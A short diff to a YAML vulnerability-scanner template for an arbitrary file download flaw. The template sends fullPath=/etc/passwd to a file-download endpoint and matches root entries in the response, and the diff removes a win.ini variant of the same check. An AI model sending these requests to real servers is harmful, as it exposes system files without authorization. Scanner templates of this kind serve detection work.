@@ -6,12 +6,6 @@ groups:
       body: fullPath=/etc/passwd
       expression: |
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
-  wins:
-    - method: POST
-      path: /fileDownload?action=downloadBackupFile
-      body: fullPath=/Windows/win.ini
-      expression: |
-        response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 detail:
   author: B1anda0(https://github.com/B1anda0)
   links:
